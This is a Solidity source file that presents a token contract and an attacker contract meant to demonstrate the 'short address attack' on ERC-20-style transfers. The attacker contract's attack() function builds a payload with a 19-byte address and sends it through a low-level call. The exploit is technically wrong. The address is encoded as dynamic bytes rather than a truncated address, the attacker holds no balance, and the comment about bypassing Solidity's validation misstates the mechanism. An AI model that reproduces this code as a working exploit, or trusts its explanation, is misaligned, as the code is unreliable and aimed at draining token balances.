// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

interface IVulnerableToken {
    function transfer(address _to, uint256 _amount) external;
    function balanceOf(address _owner) external view returns (uint256);
}

contract VulnerableToken {
    mapping(address => uint256) public balances;

    constructor() {
        // Initial distribution of tokens
        balances[msg.sender] = 10000;
    }

    // Vulnerable function to demonstrate Short Address Attack
    function transfer(address _to, uint256 _amount) public {
        require(_to != address(0), "Invalid address");
        require(balances[msg.sender] >= _amount, "Insufficient balance");

        // Transfer logic
        balances[msg.sender] -= _amount;
        balances[_to] += _amount;
    }
    
    // Helper function to get the balance of an address
    function balanceOf(address _owner) public view returns (uint256) {
        return balances[_owner];
    }
}

contract ShortAddressAttacker {
    IVulnerableToken public vulnerableToken;

    constructor(address _vulnerableTokenAddress) {
        vulnerableToken = IVulnerableToken(_vulnerableTokenAddress);
    }

    // Function to exploit the short address vulnerability
    function attack() public {
        // Normally, addresses are 20 bytes (40 hex characters).
        // We're going to use a short address with only 19 bytes (38 hex characters).
        bytes memory shortAddress = hex"3bdde1e9fbaef2579dd63e2abbf0be445ab93f"; // 19 bytes

        // Encoding the function call with the short address and amount
        bytes memory payload = abi.encodeWithSignature("transfer(address,uint256)", shortAddress, 1 ether);

        // Sending the payload directly via low-level call to bypass Solidity's input validation
        (bool success, ) = address(vulnerableToken).call(payload);
        require(success, "Attack failed");
    }

    // Function to check the balance of the attacker contract
    function checkBalance() public view returns (uint256) {
        return vulnerableToken.balanceOf(address(this));
    }
}
